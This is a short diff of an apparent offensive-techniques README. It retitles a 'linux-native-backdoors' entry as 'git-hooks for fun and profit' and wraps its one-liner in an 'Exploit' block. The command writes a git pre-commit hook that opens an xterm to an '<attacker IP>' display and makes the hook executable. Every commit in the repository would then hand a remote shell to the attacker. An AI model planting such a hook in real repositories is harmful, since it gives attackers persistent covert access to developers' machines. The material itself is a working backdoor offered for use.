@@ -1,5 +1,10 @@
-linux-native-backdoors
+git-hooks for fun and profit
 ======================
 
-echo "xterm -display 127.0.0.1:1 &" > .git/hooks/pre-commit; chmod +x .git/hooks/pre-commit
+**Exploit**
+```shell-session
+
+echo "xterm -display <attacker IP>:1 &" > .git/hooks/pre-commit; chmod +x .git/hooks/pre-commit
+
+```
 
